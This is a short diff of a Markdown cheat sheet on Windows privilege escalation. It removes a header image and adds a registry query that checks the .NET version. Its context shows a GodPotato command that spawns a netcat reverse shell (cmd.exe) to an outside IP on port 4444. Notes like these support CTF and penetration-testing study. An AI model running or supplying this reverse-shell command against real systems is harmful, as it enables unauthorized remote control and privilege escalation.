@@ -1,4 +1,4 @@
-![image](https://github.com/lw8192/Red-Team-Rising/assets/81585869/1122f6da-b12c-4dd2-be39-a1c0744bc904)# Windows Privilege Escalation
+# Windows Privilege Escalation
 ## Contents 
 - [Windows Privilege Escalation](#windows-privilege-escalation)
   * [Contents](#contents)
@@ -150,6 +150,7 @@ For most CTFS all you should need is winPEAS
 ### GodPotato    
 https://github.com/BeichenDream/GodPotato     
 
+    reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"   #check framework version    
     GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.1 4444"
 ### PrintSpoofer 
 SeImpersonatePrivilege. Windows Server 2016, Server 2019, and Windows 10.          
